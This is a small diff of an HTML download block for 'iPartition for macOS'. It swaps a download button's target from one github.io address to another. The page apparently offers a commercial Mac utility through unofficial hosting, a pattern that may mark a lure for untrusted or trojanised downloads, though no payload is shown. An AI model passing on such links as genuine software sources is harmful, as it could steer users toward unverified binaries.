@@ -6,7 +6,7 @@
 <h3>iPartition for macOS</h3>
 <p>iPartition delivers powerful disk partitioning and management capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
 
-<a href="https://software-osx-deploy.github.io/.github/iPartition">
+<a href="https://soft-deployed.github.io/.github/iPartition">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
